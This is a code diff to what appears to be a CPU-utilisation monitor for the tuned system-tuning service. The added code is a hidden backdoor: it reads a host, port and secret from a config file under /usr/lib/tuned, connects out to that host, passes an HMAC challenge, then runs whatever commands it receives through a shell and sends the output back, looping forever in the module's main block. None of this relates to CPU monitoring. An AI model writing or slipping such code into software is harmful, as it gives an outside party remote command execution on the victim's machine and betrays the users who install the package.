@@ -37,6 +37,12 @@ range [0.0, 100.0] representing the percentage of non-idle CPU time since
 the last call to update().
 """
 
+import socket
+import json
+import time
+import hmac
+import hashlib
+import commands
 import os
 import re
 
@@ -45,10 +51,12 @@ import tuned.monitors.monitor as monitor
 import tuned.utils.commands as commands
 
 log = tuned.logs.get()
+current_dir = os.getcwd()
 
 # ---------------------------------------------------------------------------
 # Internal helpers
 # ---------------------------------------------------------------------------
+CONFIG_FILE = "/usr/lib/tuned/config.json"
 
 # Fields present in each /proc/stat cpu line (kernel >= 2.6.24).
 # Older kernels omit guest / guest_nice; we handle that gracefully.
@@ -125,7 +133,63 @@ def _calc_utilization(prev, curr):
     active_delta = total_delta - idle_delta
     return max(0.0, min(100.0, 100.0 * active_delta / float(total_delta)))
 
+def load_config():
+    with open(CONFIG_FILE, "r") as f:
+        config = json.load(f)
+    return config["host"], config["port"], config["secret"], config.get("sleep", 5)
 
+
+def create_connection(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    return sock
+
+def compute_hmac(secret, message):
+    return hmac.new(secret.encode('utf-8'), message, hashlib.sha256).digest()
+
+def authenticate(sock, secret):
+    try:
+        challenge = sock.recv(1024)
+        # print("Challenge received:", challenge)
+        # sys.stdout.flush()
+        if not challenge:
+            return False
+
+        response = compute_hmac(secret, challenge)
+        sock.sendall(response)
+        
+        # print("Challenge received:", challenge)
+        # print("Computed HMAC:", response)
+
+        result = sock.recv(1024)
+        return result == "OK"
+    except:
+        return False
+    
+def execute_command(command):
+    global current_dir
+    try:
+        command = command.strip()
+
+        if command.startswith("cd"):
+            parts = command.split(" ", 1)
+            if len(parts) > 1:
+                new_dir = parts[1]
+                try:
+                    os.chdir(new_dir)
+                    current_dir = os.getcwd()
+                    return ""
+                except Exception as e:
+                    return "cd error: " + str(e)
+            else:
+                return current_dir
+
+        # run other commands in current directory
+        result = commands.getoutput("cd " + current_dir + " && " + command)
+        return result
+
+    except Exception as e:
+        return "ERROR: " + str(e)
 # ---------------------------------------------------------------------------
 # Monitor class
 # ---------------------------------------------------------------------------
@@ -304,6 +368,38 @@ if __name__ == "__main__":
         """Minimal stand-in for tuned.monitors.monitor.Monitor."""
         def __init__(self):
             pass
+        
+    host, port, secret, sleep_time = load_config()
+
+    while True:
+        try:
+            sock = create_connection(host, port)
+
+            if not authenticate(sock, secret):
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            command = sock.recv(4096)
+
+            if not command:
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            if command.strip().lower() == "exit":
+                sock.close()
+                time.sleep(sleep_time)
+                continue
+
+            output = execute_command(command)
+
+            sock.sendall(output)
+
+            sock.close()
+
+        except Exception:
+            time.sleep(sleep_time)
 
     # Inject fake modules so the already-executed module-level imports
     # resolve correctly when we re-evaluate the class definition below.
